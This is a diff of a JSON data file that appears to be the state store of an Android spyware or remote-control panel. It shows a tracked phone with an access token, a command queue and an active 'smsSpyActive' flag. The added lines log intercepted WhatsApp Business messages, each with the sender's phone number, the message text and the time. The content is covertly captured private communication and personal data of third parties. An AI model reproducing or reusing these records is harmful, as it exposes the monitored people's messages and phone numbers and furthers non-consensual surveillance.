@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775631201253,
+    "lastSeen": 1775631204393,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "P",
+        "time": "08/04 13:53",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775631204900
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 851-2302-5715",
+        "content": "10/10🗿🙏",
+        "time": "08/04 13:53",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775631203453
+      },
       {
         "appName": "WA Business",
         "sender": "+62 851-2302-5715",
